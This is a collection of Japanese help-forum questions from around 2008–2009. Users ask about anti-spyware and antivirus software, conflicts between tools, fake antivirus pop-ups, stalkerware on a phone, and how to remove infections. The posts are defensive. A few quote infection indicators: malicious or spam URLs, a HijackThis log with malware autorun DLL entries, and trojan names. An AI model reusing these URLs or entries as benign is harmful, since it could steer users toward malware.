WindowsVista に関する（トレンドマイクロ社）の「Q&A」で次のような答えが掲載されております。 --------------------------------- Windows Vistaには、スパイウェアなどの迷惑ソフトウェアからコンピュータを守る Windows Defenderと呼ばれるセキュリティー機能が搭載されています。 ウイルスバスターにもこれらの迷惑なソフトウェアの対策機能が搭載されておりますので、 インストールされる際にWindows Defenderを無効に設定することをおすすめします。 ---------------------------------- お尋ねします。 もし Windows Defender を無効にしなかった場合は、どのような障害が発生する可能性がるのでしょうか？
総合のセキュリティソフトとスパイウエアのソフトも併用しないといけないでしょうか。 当方ネットサーフィン（グロあり）、アプリなどで画像加工、ニコニコなど動画観覧、毎日１０時間はつなげてます。 併用となれば、常駐するもの（スパイスイーパーやＳＧアンチマルウエアなど）か、しないものどちらがいいのでしょうか。 よろしくお願いします。
Ad-Aware Free Anniversary Editionに更新したところ、ネットに繋がらなくなったため、アンインストールしました。 古いバージョンのAd-Aware 2008 を探していますが見つかりません。 ご存知の方がいればご教示頂けると助かります。 よろしくお願い致します。
スパイウェア対策に Ad-aware、ウィルス対策にはavast! 4.8 Home edition を併用しています。 今日 Ad-aware の方をアップデートしたところ、anniversary edition になっていました。 タスクバーに、今までなかった Ad-aware のマークが出ているのですが、このまま併用しても大丈夫でしょうか。 ご回答お願いします。
Ｘ-cleanerでチェックしたところEasy　Searchが発見されました。 パソコンにはウイルスバスターが入っているのですがこちらでは 発見されませんでした。 Ｘ-cleanerでは有料のバージョンの方でないと削除はできないようです。 有料のソフトを買っての削除の方法しかないのでしょうか？ このスパイウェアについてもよくわからないので アドバイス頂けるとありがたいです。 このままにしておくのは危険なのでしょうか？
Dialer_XEng004 チェックをしていたらスパイウェアで上のものが検出されました。 グーグルなどでどうゆうものか検索していたのですが出てこなくて・・。 そこでご存知の方いらっしゃればと思い質問させていただきました。 「Dialer_XEng004 」これはどうゆスパイウェアでしょうか？ ご存知の方いらっしゃいましたらよろしくお願いします
WindowsXP(SP3)でSpywareBlaster(最新版4.1)を使用してます。 基本的な使い方の確認ですが、定期的にUpdateするだけで良いのでしょうか？ Updateする度に「Enable All Protection」を 実行してしまう癖がある のですが、その必要はありませんか？ 常駐してる感覚のないソフトですが、簡単にはどんな効果があるのでしょうか？
友人から購入したパソコンにファイヤーウォールソフトの Outpost Firewall　pro v2.7が導入されていたのですが、ウィスル対策ソフトの方が更新期限が切れていたので、無料で有名な　avast　を使おうと考えていますが、この組み合わせは相性的ににはどのようなものなのでしょうか？　どなたかこのような組み合わせで使用されていらっしゃいます方はいますでしょうか？使用具合はどのような感じでしょうか？
Ad-Aware Free Anniversary Editionの常駐機能、Ad-Watch Live!にはどのような機能があるのでしょうか？ 例えばダウンロードしたファイルにスパイウェアが含まれている場合、警告して取り除いてくれるといったものでしょうか？
先日、Ad-Awareをアップデートしようとしたら Ad-Aware Free Anniversary Editionになるとの事で Ad-Aware Free Anniversary Editionにアップデートしました。 使用感は問題ないのですが(むしろ以前よりも良い)、 ＰＣを立ち上げたときに常駐タスクに常にAd-Awareが・・・ ＰＣを買い換える前の低スペックなので、必要ではないときには出来るだけ常駐タスクが出ないようにしているのですが、 msconfigでスタートアップからそれと思しきもの (AAWTray)のチェックを外して適応にし、再起動しても、 また常駐タスクが出てしまうのです。 これは消す事は出来ないのでしょうか？ 上手く説明出来なくて申し訳ありませんが、 お分かりの方いらっしゃれば、どうぞ宜しくお願い致します。
ウイルスバスターユーザーです OSに不具合が出たので半年振りにクリーンインストールしています OSの次にウイルスバスター2009を入れようとしたのですがなぜかサイトから持ってこれません ここです http://jp.trendmicro.com/jp/products/personal/vb … ここ以外に持ってこれるところありませんか　
趣味のイラストサイトを運営しています。 FC2のスペースを借りて、お絵かきBBS（http://www.oekakibbs.com/）のレンタル掲示板を置いてるだけの簡素なサイトなのですが、 最近来訪者から「危険なサイトです（スパイウェア）と、ウイルスバスターの警告が表示されてしまいます」との連絡がありました。 １ヶ月程前から急にネット接続が遅くなったので、PCはリカバリーしたばかりです。 サイトのフォルダもウィルスチェックしましたが、何も検出されませんでした。 これからも同じ形でサイト運営したいのですが、この後何をどう対処すればよいのか分かりません。 サイト自体に問題があるのか、レンタルのお絵かき掲示板に問題があるのか判断する方法はあるのでしょうか。 どなたか教えていただけないでしょうか？
昨日（1/20）リリースされたタイトルソフトなのですが，一見無事インス トール終了して再起動メッセージ後，AutoUpdate 終了→再起動まで行くの ですが起動出来ません（ショートカット，及び本体）エラーメッセージも 出ません．最初は旧版の 2008 を削除せずにインストールして失敗したの で，2008 をインストール後，もう一度 2008 をアンインストール後に再 度新規で 2009 をインストールしましたが，結局症状は同じでした． Hardware: IBM ThinkPad T41p, 2GB RAM, 250GB HDD OS: WinXPproSP3 + Visual C++ 2008 Redistributable - x86 9.0.21022 AntiVirus, Firewall: Eset SmartSecurity 3.0.669 何か原因や情報がありますれば御教授願います．
windows live messangerを携帯でログインして、すこしそのまま放置にしていました。すると、普段入ってこない相手３名からはいってきました。そこには awesome.quickgiftz.com とjust.reallyc00l.co.という同じurlがはいってきました。この三人同士は全然接点もないしこのurlにアクセスしても接続できませんになります。　これはウイルスでしょうか？ウイルスやスパイウエアだとしたら相手が感染しているのか、私が感染しているのかどちらなのでしょうか？ちなみに相手は３人とも外国の方です。
フリーソフトのファイアウォールを探してんるんですが、種類もあるので、どれを使っていいのかわかりません。。 とりあえずComodo Firewall ProというのとSygate Personal Firewall、ZoneAlarmというのを入れてみたんですが、前者は日本語対応でなかった、後者２つは使っているPCがWindows Vista SP1なので互換性がなかったということで使えませんでした。 皆さんが使ってこれはイイというファイアウォールあったら教えてください。
ウイルスバスターを起動して、教えてgooを開くと、 警告メッセージが出ました。 警告 危険なWebサイト このWebサイトは、危険なWebサイトです。 アドレスhttp://googleads.g.doubleclick.net/pagead/ads?cl …… 信頼性　危険 カテゴリ　スパイウェア 教えてgooはよいサイトだと思っていたのに、これはあんまりです。 で、これはどういった害があるのでしょうか？
このサイトを見ていると危険なWebサイトと表示されカテゴリがスパイウェアとなっております。フレッツウイルスクリアで・・・今までこんな表示は出ませんでした。何か注意点や対策はありますか？
皆さん教えてください。ネット等でいろいろ調べましたが、わかりませんでした。 環境　windowsXP Pro. SP3 ウイルスバスター2009(以前はNOD32) ＰＣはdosパラ製　セレロン2.0GHz メモリ512M HDD250GB です。 以前に山田ウイルスにかかり、その本体であるsvchost.exeは駆除したのですが、トレンドマイクロなどのセキュリティサイトへのアクセスができなくなりました。その結果パターンファイル等のアップデートができなくなりました。しかしオンラインスキャンしても検出はゼロですし、CCCクリーナーでも検出ゼロでした。 windowsフォルダ内のhostsファイル内には「127.0.0.1 localhost」しかありませんので問題ないと思います。セキュリティサイトへpingを打つと127.0.0.1に飛んでしまいます。いろいろ調べても、このhostsファイル以外で接続先を変更できるファイルのことは書いてありませんでした。 トレンドマイクロへ連絡して、キャッシュを消去してIEの設定をすべて規定に戻しましたが変化なく、その後技術サポートとは思えないくらいの話の通じなさにびっくりして、とりあえず調査を依頼しましたがリカバリーかもね？といわれました。 レジストリ内かなと思いますが、情報がありません。hostsファイルがokなら直ってます、というサイトがほとんどでした。念のためhostsファイルを削除しても現象は変わらず。 同じような現象にあった方がおられれば、ぜひ教えてください。 よろしくお願い致します。
こんにちは。 spybotの最新版を入れています。 免疫の画面で、何度immunizeボタンを押しても、unprotectedのままなのです。 その項目は、 ・internetexplore （32bit） 　software(domains)　 software(secure domains) ・internetexplore（32/64bit） default(domains)　 default(secure domains) ・internetexplore（64bit） software(domains)　 software(secure domains) .global(host) 原因が分かる方いらっしゃいますでしょうか。 また、今の段階では何か不具合がありますか？ なお、spybotのアップデートの時、 常駐機能の２つはダウンロードしておりません。 また、アップデートの時にフロッピーのアイコンのようなものも、 よくわからないのでダウンロードしておりません。 他に必要な情報があれば調べますので、 アドバイスをお願いいたします。 　
Spybot - Search & Destroyでスキャンしたら 「KGBkeylogger」という物が検出されました。 グーグルで調べてみても詳しいことが分かりません。 消しても消しても出てきます。これは一体何なのでしょうか？ 詳しい方教えて下さい。
私の知人が第３者に携帯(ドコモのSH704i)をとられて、どうやらFLEXISPYを入れられ盗聴されているみたいなのです。 FLEXISPYが本当に入れられているのか調べる方法をご存知の方はいらっしゃいますか？ また解除の仕方を教えていただきたいです。 逆探知などは可能なのでしょうか？ ドコモ会社に聞いても、わからないと言われてしまいました。 警察も被害届が出ていないと何も対応してくれません。 どなたかご存知の方、ご協力お願いします。
ある仕事関係の人にメールアドレスを教えて以来、嫌がらせのメールが来るようになりました。 今まではきたことが無かったので、タイミング的にその人が関係しているのかと思っています。 受信拒否に設定しても、毎回々違うメールアドレスで送られて来るのできりがありません。 中には細工がしてあってメールアドレスが載っていないのも送られてきます。 このような嫌がらせのメールを受信できないようにする方法はありますか？
ＰＣを立ち上げた時 右下にZoneAlarmの常駐アイコンが表示される前にネットに接続される事があるのですが、 それでも機能してるのでしょうか？ 詳しい方教えてください。
spybotをアップデートして、インストールしました。 インストールが終わり、いつも通りにデスクトップにあるspybotのアイコンをダブルクリックすると、spybotと出てきて、その後に「yes, no」の質問が出てきました。ちなみに、yesの方に制限時間がついていました。 よくわからずに、時間が過ぎていってたぶんyesになったんだと思います。 その後、ファイルがサーチされているのか「数字of総数（？）」（単位はfilesだったと思います）のような感じで左の数字が右の数字に近づいていくように増えていきました。 強制的に選択肢が決められてしまい、ファイルが関係しているのでとても不安です。 大丈夫なのでしょうか？一体、何に対しての選択肢だったのでしょうか？ わかる方、回答をお願いします。
AntiVirus2009に感染してしました。複数のウェブ情報で「SuperAntiSpyware」で削除できると書いてありましたが、ダウンロードをしようとしてもダウンロードページを表示できません。またUSB経由で他PCでダウンロードしたプログラムをインストールしようとしてもエラーでインストールも出来ない状況です。すいませんが知恵をお貸し下さい。 現在までの作業 ・システム復元の無効 ・msconfigにてav2009のチェックを外す ・タスクマネージャにてav2009停止 どうもSuperAntiSpywareのインストール等を妨害させているようです。
Internet Antivirus Pro というポップが急に現われて、英語なんですが、どうやらカード情報等を入れてセキュリティーソフトを買いなさいみたいな勧誘が、たびたび出てきてこまっております。 そのポップの隣にも Windows Security Center notification のポップが出てきて双方ともに、たびたび出てきて操作の邪魔をします。 アンインストールをしましたが、ポップが残ってしまい、消せません どなたか、削除する方法を知りませんか？
あるとき不審なメ－ルをクリックしてしまったのですが、その後送信者名が私のメ－ルアドレス名で不審なメ－ルが送られて来るようになり困っています、メ－ルアドレスを変更する以外に何かブロックする方法がないものでしょうか。
ウィルスバスターを使用していますが新聞社などのサイトを見ようとすると警告http://googleads.g.doubleclick.netとでます。 これはウィルスですか？
自分のブログをいろいろいじっていたところ、 昨夜より使っているウイルスバスター２００７から、 開くたびに 「警告　危険なＷｅｂサイト　 このＷｅｂサイトは、危険なＷｅｂサイトです。」 と警告を受けるようになってしまいました。 アドレスは　「ｈｔｔｐ://googleads.g.doubleclick.net/ で始まるやたら長いもので、 その後ろの方に私のブログのアドレスが含まれています。 信頼性は　「危険」 カテゴリは　「スパイウエア」 ‥といった感じなのですが、 自分では何がまずかったのかよく分かりません。 どなたかお知恵をお貸し下さいませ。 よろしくお願いします。
数日前、自分のミスで変なファイルをダウンロードしてしまいました。 そしたら次の日、いろいろ変なことが起こり、「指定されたモジュールが見つかりません。」とか、数日前には、「Windowsが起動できませんでした。この問題が起こる前の状態に修復しますか？修復した場合、いくつかのインストールされたプログラムは削除される可能性があります。」とかなんとか・・・。 そして修復後、Windows Defenderから通知が来て、「トロイの木馬が発見されました。警告/危険度：重大」んで削除すると押したら成功したんですが、次の日、又同じことが表示され、その次の日も・・・。そして今日まで至って、そしたら今日、削除しようと思ったらWindows Defenderにエラーがあり、削除できませんでした。ファイル名が表示されたので、コンピュータ全体を検索したらありました。プロパティを開いて検索結果を見てみたら（ウイルスバスター2009）こんな感じになってました。 _____________________________________________________________ ウイルスバスター2009このファイルのウイルス検索を実行しました。 検索結果は次の通りです。 ___________________________ ファイル名：fccywuVM.dll 検索結果：PAK_Generic.001 __________________________ ウイルスがないと「ウイルスは発見されませんでした。」と出てくるのですがこれはそう表示されないのでやはりウイルスなのでしょうか？ このファイルはやはり今すぐ削除した方が良いのですか？ 今この質問書いてる途中にWindows Defender で検索をしてたらまた新しいスパイウェアが見つかりました。 名前は：wvUOEwxY.dll です。検索してみたら三つファイルが出てきました。 wvUOEwxY.dll と wvUOEwxY.dll.xor と wvUOEwxY.dll.xor(同じのが二つ） 一番怪しいwvUOEwxY.dllのプロパティを見てみると驚いたことにウイルスは見つかりませんでしたと表示されました。 そして削除を試みたら成功しました。（＾ｗ＾；） いったい僕は何をすればいいのでしょうか？ 初期化？この怪しいファイルを削除？ ちなみにウイルスバスター2009で総合検索＆クイック検索しても何も見つかりませんでした。 回答よろしくお願いします。
　先日よくアクセスするサイトに、ウイルス HTML_IFRAME.AFB に感染していたという報告文が載りました。常駐させているウイルスバスターは特に反応せず、ウイルス・スパイウェア検索も行いましたが、何も検出されませんでした。 ところが、ログをみると、ウイルス・スパイウェア検索ログには何もないのですが、フィッシング対策ログには件のサイトにアクセスした時間に記録があります。ＵＲＬ欄にh_ttp://gogo2me.net/.go/check.html とあり、「web上の脅威」というコメントが付いていました。件のサイトのＵＲＬとは違います。そこでさらに、サイトについて感染やその他調査してくれるサイトh_ttp://www.aguse.jp/ で、ログにあったＵＲＬについて調べてみると、ウイルス検出でTrojan-Downloader.HTML.Agent.mu というのが出てきました。 　ついに訳が解らなくなってしまい、こちらでお聞きしてみることにしました。 (1)フィッシング詐欺対策ログの読み方について、このログは、何を意味しているんでしょう？ 　 「危ないURLにアクセスしないようブロックした。このパソコンは安全」？ 「危ないURLにアクセスした。このパソコンは危険」? 「その他」　? (2)ファーミングされてブロードバンド・ルーターなどの接続の設定が書き換えられている可能性はあるでしょうか。 どうしたらそれがわかりますか？またどうすべきでしょうか？ (3)今回、自分のパソコンからはウイルス・スパイウェアは検出されていません。 アクセスしたはずのサイトとは違うURLでフィッシング詐欺対策で引っかかったというのは、どういうことなのでしょう？ それとも件のサイトが感染していたというウイルスとは、別件で考えるべきなのでしょうか? (4)今の状態をふまえて、今、対処しておくべきことはありますか? 　 パソコンの使用環境は、WindowsXP homeEdition SP3 セキュリティとして、ウイルスバスター2009の他に、プロバイダーのサーバーでのウイルス駆除がかかっています。 　アップデートはきちんと行っています。　 　インターネットブラウザは、パスワードなどを使うサイトはIE7、閲覧するだけならsleipnir1.66を使っています。 ごちゃごちゃと書いて申し訳ありませんが、どうぞお力をお貸しください。
　先日、パソコンを買い換えたのですが、どうもJwordプラグインが出荷状態でインストールされているモデルでした。 　買い換える前にはインストールしないように注意していたのですが、初期状態で入っていられるとさすがにどうしようもなく、とりあえず参考サイト様（http://www.higaitaisaku.com/removecnsmin.html）を見ながらJwordをアンインストールしました。 　・「アプリケーション（プログラム）の追加と削除」から「JWord(日本語キーワード)」を選んで削除をクリック 　・アンインストーラが立ち上がるのでそれに従って削除 　・アンインストールが完了したら、指示に従ってPCを再起動 　・Spybot S&D等で、検出された「ゴミ」を削除 　・再度PCを再起動 （上記サイト様から抜粋） 　以上の手順で進めていたのですが、「・Spybot S&D等で、検出された「ゴミ」を削除」で少し引っかかる現象が起きました。 　私はてっきりここで検出された「CnsMin」を削除して駆除完了、と思い込んでいたのですが、VB2009、spybot、Ad-Aware全てでスキャンしても、検出されてくるのはクッキーくらいでCnsMinがどこにも現れません。もちろん本来歓迎すべき状態ですが、私としてはここで検出されるものと思っていたもので、何も出てこないとなるとどこかで間違えて削除失敗したのかと不安になってしまいます。 　もしかすると「・「アプリケーション（プログラム）の追加と削除」から「JWord(日本語キーワード)」を選んで削除をクリック 」の段階でCnsMinは既にPC内から除去されているものなのでしょうか。さすがにものがものなので再インストールして検証する気にもなれず、できれば過去に同様の手順で削除された方のご助言をいただければと思い、質問いたしました。 　よろしくお願いします。 PCの状態は OS:windows XP SP3 ウィルスバスター2009 spybot1.6 Ad-aware2008 定義ファイルは全て最新（2009/1/10段階）でした
Spybot-Search＆Destroyでスキャンしたら以下が検知されました。 ・DoubleClick ・KGBkeylogger ・Microsoft.Windows.Explorer ・Microsoft.WindowsSecurityCenter.TaskManager ・Right Media そして削除しようとしたら "いくつかの問題個所が修正/削除できません;理由はファイルがメモリ上にある為です。 この問題は再起動後に修正/削除できます。 次回のシステムスタートアップでSpybot-S＆Dを起動しますか？" [はい] [いいえ] というメッセージが出て、[はい]を押して再起動後にSpybot-S＆Dが起動して またスキャン？みたいなことが始まって終わったのですが、念のため今日さっきまたスキャンしてみたら また前回と同じ内容のファイルが検出されていました。 これは削除できないのでしょうか？どうすれば削除できますか？
お世話になります。 Spybot - Search & Destroy1.5.2の常駐を別の作業に支障が出るのを控えたいので”一時停止”をしたいのですが、可能でしょうか？ ご存知の方是非アドバイスをお願いいたします。
今回は、スパイ用ソフトの事で 幾つか質問が、あるんですが このスレ(？)は、以前ある事で質問した続きでも、ありますんで http://oshiete1.goo.ne.jp/qa4603540.html 回答者の返答では、主旨の違う回答が見えるかも知れませんが その場合は、御了承下さい ＯＳはビスタで、スパイ用ソフトは 「Ad-Aware 2008 Free v7.1.0.11」「Spybot-Search&Destroy1.6.0.30」 「SUPERAntiSpyware」です 尚、以後の文章で、これらのソフト名は 文字数的な事も考えて、カタカナ名表示します 尚、関係無いかも知れませんが ウィルス用ソフトは、ＮＯＤ３２の2.7で正規ユーザーですが 現在は使い心地の確認の為、ESET Smart Securityの体験版を使用 期限切れ時にＮＯＤ３２の3.0に戻そうかと思ってます それとブラウザはＦｉｒｅｆｏｘ３です 更に、私の使用目的を書かせて頂くと ネット接続する時には、ＨＰへのアクセスやミクシィ等での交流の他 少し変な話ですが、複数の無料アダルトＨＰから動画をＤＬしてます 従って、以前のＭＥ時代でも セキュリティ面のサポート事を考えて スパイは、スパイボットとアドアウェアで 週１回、通常＆セーフモードで ウィルスは＜ＮＯＤ３２で隔週の手動検索を、してたのと ブラウザもＩＥからＦｉｒｅｆｏｘに変えました それでは質問を箇条書きに、させて頂きましたが 解説は後に載せてます ◆１、スパイボット、アドアウェア、スーパアンチスパイウェア 　共存は問題無い？ この質問の主旨は、３者を使用したいと言う訳じゃないんですが スパイボットとアドアウェアは使用してた為 使い心地は分かってますが スーパアンチスパイウェアは未使用の為 共存で問題が無ければ、一時的に３者を入れ勉強 使い心地を体験 その後、１～２個で使用したいと考えてます ◆２、スパイボット、アドアウェア、スーパアンチスパイウェアの性能の違いは？ スーパアンチスパイウェアは初めて入れたんで 使い心地等も分かりませんが スパイボットとアドアウェアに関しては、ＭＥ時代に使用してます しかし、性能等に関しては 実際にスパイがヒットする事は、ほとんど無く 毎回の様に、両者ともクッキーしかヒットしませんから分かりません ただ…スパイボットよりアドアウェアの方が 検索するファイル数が、３倍位多い…しかし時間の方は これも半分位の時間でした 但し、素人目には、ファイル数が多いから優秀？と感じますが 実際には 検索する場所が違うだけとの事も聞いた事が、あります それで、この３者を比較した場合 性能が、どう違うのかと思いました ◆３、アドアウェアの検索が途中で止まります この内容なんですが 実は、今回の質問の中では一番の問題点なんです 更に、具体的に見て頂こうと思い 今回、画像を添付しました それで、方法としては通常(？)設定で検索してるんですが まずソフトを起動 「スキャンナウ」をクリック「フルスキャン」を選択 「スキャン」をクリックでスキャン開始に、なるんですが いつも同じ所で止まってしまい そこから何分待っても画面が進まないんです それで、通常は、あまり見ませんが ＨＤのランプを見ても、止まってる感じです 更に、スキャン時もＭＥ時代同様に、通常モードと セーフモードの両方でスキャンしましたが やはり同じ所で止まってしまうんです 場所としては「スキャニング、インサイド、アーカイブ」 と書いてあるんでしょうか？ その場所で止まる様なんです ちなみに、スパイボットでの検索では全く問題無く検索出来ます 一応、私も、ここの検索で調べましたが ウィルスバスターとの愛称は悪い様ですが 私のソフトは違いますんで、どうなのかな？…と… 最後に、この質問を、したからと言って セキュリティ対策が万全だとは思ってません 以上の質問を宜しく、御願いします
いろいろと調べたのですがアンインスコしても消えないし、いくらなんでも数が多いと思うのですが よかったらわかる人教えてください
スパイウエアによって個人情報が流失するということがかなり広く言われるようになってきましたが、個人のパソコンの場合どの程度のことまで盗めるものなのでしょうか? また、スパイウエア対策ソフトを使った場合個人情報流失は完全に防げるものなのでしょうか？
こんにちは。 trojan-psw.win32.magania.aqihと言うスパイウェアに感染してしまったようです。このウィルスの駆除方法等、分かる方がいらっしゃいましたら教えて下さい。 私の場合、原因はカボスの様です。 よく使い方も分からないのに適当に弄っていてウィルスファイルに当たってしまったようです。ウィルスセキュリティーでパソコン内を検査し、該当と見られるファイルを削除したのですが、現在も攻撃？が止まらないのですが…。 ※添付写真(URL)を参照下さい。 http://villagesurf.up.seesaa.net/image/2009y01m0 … 最初はFドライブ（外付けハードディスク内）を攻撃していたのですが、そちらの電源を切ったらCドライブを攻撃してくる様です。 既に800件もウィルス処理を続けています。 【セキュリティーソフト】 ソースネクスト・セキュリティーゼロ 【PC】 DELL OPTIPLEX GX620 Windows XP
Windowsをシャットダウンするときに、 カードリーダールックアップウインドゥプログラムの終了中です。 と表示がでます。そしてこのブログラムは応答してません。 と出てから終了を押すと終了するのですが、なぜ、このように 終了しようとするとこの表示がでるのかが分かりません。 どうなっているのでしょうか？ ちなみにすんなり終了できるときもあります。 宜しくお願いいたします。
ビスタ対応のスパイ用ソフトを フリーソフトで探してます ブラウザはＦｉｒｅｆｏｘ２で 間もなく３に変更予定です 更に、関係ないかも知れませんが ただ、ビスタにもスパイ機能は付いてるんですが 色々ネットで調べた結果 他のソフトを使用した方が良い様だと判断しました それで、以前にも質問した時 SUPERAntiSpyware FreeEdition a-squared Freeを紹介して頂いたんですが 私は以前ＭＥを使用しており その時には、スパイボットと アドアゥエア(Ad-Aware)を使用してました しかし、調べた所 この両者がビスタ対応じゃない事を知った為 他のソフトを探してた訳です ただ、その後にスパイボットは ビスタ対応が出てるのを知ったんですが 以前紹介して下さった方が “Spybotもも過去の遺物”と書かれてました これが、どういう意味なのかが分かりませんでした …つまり、昔と比較して、どうなってるのか？ 更に“a-squared Freeは誤検出もあるそうですが” とも書かれてたんですが これは例えばですが、私の経験上では スパイボット等も、スパイだけじゃなく クッキー類も頻繁にヒットしてましたが それとは意味なのか？… それで現在最後に、御紹介の SUPERAntiSpyware FreeEditionとa-squared Freeでは どっちが良いのか？ また、他に御勧めのソフトは？ そう思い、質問しました 尚、ＭＥ時代には使用してましたが SpywareBlasterに関しては、現在使用予定は ありません
質問です、パソコンにマカフィーを入れておくとサイトの危険度が緑、黄色、赤で出てきますよね？ 害の無い緑色で表示されているサイトから他のサイトに行ったときにいきなり色が赤色になったのでサイトアドバイザーのところにカーソルを当てたら、怪しいスパイウエア（だったと思います）が一個検出されましたというようなコメントが出てきたのですが、これってもう手遅れなのでしょうか？それともなにもせずにサイトから消えれば（戻るなどして）大丈夫なのでしょうか？教えてください
ここの質問検索で「ハッキング　画面」して、同じような懸念で「隣の家からハッキング」がありました。 http://oshiete1.goo.ne.jp/qa2374933.html これにアドレス一覧を表示する「Look@LAN」というツールが紹介されていたのでインストールし起動してみると、知らないIPアドレスがありました。 どうしたら削除できるのでしょうか？無効にできるのでしょうか？ WindowsUpdateしてもファイヤーウォール入れても解決しません。判る人いましたらよろしくお願い致します。
アバスト、コモドのコンビで運良く感染などせず乗り切ってきました。 PCの調子が悪くなりリカバリしたのですが、再度コモドを入れたら無線LANが全く繋がらなくなりました。 色々設定をいじったりしましたが、全くだめです。 コモド自体を止めても全く繋がりません。 ですがアンインストすれば繋がります。 今までは特別な設定などせずともネットに繋がっていました。 それと新しく入れたらネットワークに名前をつけろとポップアップがでます。 こんな経験も初めてです。 こちらのレベルはど素人です。 解決方法があればお教えください。 宜しくお願いします。
24時間ブロックし続ける送信元IPアドレス・Multicast Listener Report ウイルスバスターのセキュリティーレポートを見てみると、1週間丸ごと同じ送信元IPアドレスをブロックし続けているのを発見しました。 ＰＣを起動している間、24時間常に同じ送信元IPアドレスをファイアーウォールでブロックしています。 スパイウェアには詳しくないのですが、10分間に20回のペースでブロックしているようなので気になります。 どういうことなのかわかる方はいませんか？ ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー 種類 パーソナルファイアウォールによってブロックされた、通信の種類。 [ファイアウォール] アプリケーションパス 通信をブロックされたアプリケーションの、ファイルの場所。 [---] アプリケーション名 通信をブロックされたアプリケーションの名前。 [---] 説明 ブロックされた通信の詳細情報。 [Multicast Listener Report] ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー OS:WinsowsXP(SP3) ブラウザ:ファイアーフォックス 　　　　:IE.7 セキュリティーソフト:ウイルスバスター2009
いつもお世話になっています。お聞きしたい事があり質問させていただきます。私は今まで使用していたセキュリティソフトの期限が切れた為、以前より使用してみたかったカスペルスキーのインターネットセキュリティ2009の試用版を導入しているのですが、いつまでも『コンピュータは脅威にさらされています』のままになっています。定義ベースは最新で、完全スキャンも実施し、スキャンで出てきたウィルスも削除、『未処理の脅威』もない状態です。どの様にすれば上記のコメントが改善されるのかアドバイスをお願い致します。
C:\WINDOWS\Prefetch\ALG.EXE-275708CF.pf というファイルをスキャン中に、３０分以上経ってもスキャンが進まずにフリーズしているようです。（タスクマネージャでは「実行中」となっていますが） ファイルサイズは１６ＫＢほどなので、時間が掛かる理由がわからず、念のためにVirus Totalで調べてみましたが、ウイルスでもスパイウェアでもないようです。 何か改善策はないでしょうか？ スキャン時にこのファイルを別のドライブやフォルダに移動させたりしてもいいのでしょうか？
EvID4226Patch223dというパッチでTCP/IPの制限をあげようとしたのですがＡＶＧというスキャンソフトに引っかかり、「不審なファイルです。脅威名前・HackTool.AB」と出ました。 実行してもいいものなのでしょうか？とても困っています。
　使用PC DELL DIMENSION 3100C CPUP:Intel Celeron D 3.06Ghz メモリ:512MB OS:Windows XP Home Edition SP3適用済み 　最近ウイルスにやられたらしくPCの調子が悪いのでウイルス検査してみると C:\WINDOWS\system32\tuvUMDWm.dllというファイルがウイルスに感染しているとのこと。 駆除できなかったのでUbuntu Linuxを起動してそのファイルを削除。とりあえずPCからウイルスはなくなったようだ。 しかしタスクバーに「自動更新が無効になっています」というメッセージが出てくる。セキュリティーセンターを開くと、やはり無効になっている様子。そこで自動更新の設定画面を見てみると、ちゃんと自動更新はオンになっている。 なぜだ？ウイルスにやられた後遺症のようである。それ以外は問題なく使えているが、セーフモードで起動し、セキュリティーセンターから、自動更新の設定画面に移動しようとすると、図のようなメッセージが出てくる。ためしに正常に使えているPCで同じようなものが出てくるか確かめてみたが、でてこない。この問題をOSの再インストールなしで修復するにはどうしたらよいか教えてください。
ノートPCでOSはXPです。ネットはケーブルテレビでルーターを かましています。V3ウイルスブロックとSpYBotでウイルス対策を やってきました。SpyBotやV3では何のスキャンによる検出も最新 アップデータではありませんでしたが、シマンテックのオンライン スキャンにて、 １）TrojanPackedNsAnti ２）Trojan.mint ３）BloodhaundPackedjump　に感染したファイルが見つかりました。 ネット検索してもこれらのウイルスがどのような脅威か、削除はどうす るのか確認できませんでした。シマンテックの正規版でも駆除できない とのレポートもありました。 これらのスパイウエアーの脅威と駆除法について、ご教示ください。 またお勧めのアンチスパイウエアーソフトもありましたら教えてく ださい。
昨晩、プログラムに関することで検索したページを開いて見ていたら、突然ウィルスソフトが起動し警告が出ました。海外のサイト（質問掲示板）でした。 当然、ウィルスソフトでキックするためのアイコンをクリックしたのですが、その後、ブラウザ上に広告のようなものが表示されてしまい、ブラウザの１／３を埋め尽くされて、うっとうしくて仕方がありません。 現在、インストールしてあるAVG（ウィルス対策ソフト）、AdAwareやSpywareTerminatorを使ってスキャンと駆除をしたのですが、効果がありません。またいくつかのオンラインスキャンも試したのですが効果がありません。 また絶対的な信頼をおいていたSpybotがなぜか起動しなくなり、同時にＯＳのシステムの復元もができなくなってしまいました。 解決策をご存知の方、回答お願い致します。 よろしくお願いします。
Ad Awareの更新が最近出来なくなしました。それで、削除してから、再インストールしようと考えましたが、プログラムの削除の一覧になく、アンインストーラーのアイコンも見つかりません。どうすれば良いでしょうか？
２、３日前からspybotS&Dがvirtumondeを検出するようになりました。 ComboFixとSuperAntiSpyware等を使いそれなりに駆除することごできたのですが、まだHijackThisのログにある O4 - HKLM\..\Run: [kuvilunugi] Rundll32.exe "C:\WINDOWS\system32\sunimuju.dll",s O4 - HKLM\..\Run: [6865a191] rundll32.exe "C:\WINDOWS\system32\sumttcvw.dll",b というファイルを駆除できまでん。どなたか駆除の仕方をご存知の方、助けてください。 使用しているOSはWindows XPです 発生する現象： Windowsを起動した時にsystem32\sunimuju.dllとsystem32\sumttcvw.dllの読み込み中にエラーが発生しましたとでます。 SpybotS&Dのスキャン中にVirtumonde.prxが検出される。 これ以外に特に何もおきません。また、SuperAntiSpywareでは何も検出されません。このspywareは一体何をしているのでしょうか? ProcessExplorerとレジストリから本体を消去しようとしたのですが、どのように本体を特定すればいいのか解らずできませんでした。 今現在、SmitFraudFixも試しましたが駆除できてません。VundoFixはバグがあると聞き使用していませんが、このspywareを駆除できるのでしょうか? どなたか駆除の方法を知っている方、回答をお願いします。
昨日FireFoxを起動させたときにMcAfee SiteAdvisor(バージョン28.0)に更新したところMcAfee SiteAdvisorが表示されなくなりました。 実際にgoogleで検索してもサイト名の横に緑やら赤などの印が出てきませんでした。 それだけでなくTab Mix Plusも機能しなくなりました。 幸いMcAfee SiteAdvisorを無効化したところTab Mix Plusは機能するようになったのですが・・・。 どうすればMcAfee SiteAdvisorが機能するようになるのでしょうか？
